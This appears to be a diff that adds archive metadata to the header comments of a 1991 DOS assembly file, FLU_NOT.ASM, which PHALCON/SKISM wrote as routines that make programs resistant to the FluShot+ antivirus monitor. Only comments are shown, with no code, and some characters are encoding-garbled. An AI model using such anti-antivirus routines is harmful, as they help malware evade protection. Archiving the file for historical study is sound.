@@ -1,6 +1,17 @@
-; FLU_NOT.ASM þ Routines to be linked into your FluShot+ resistant
-;             þ programs.
-; Version 1.0 þ 27 November 1991
+; ------------------------------------------------------------
+; name      F
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
+; FLU_NOT.ASM ï¿½ Routines to be linked into your FluShot+ resistant
+;             ï¿½ programs.
+; Version 1.0 ï¿½ 27 November 1991
 ;
 ; Written by Dark Angel and Demogorgon of PHALCON/SKISM Co-op
 ; Look for more Anti-Anti-Viral Utilities from us!
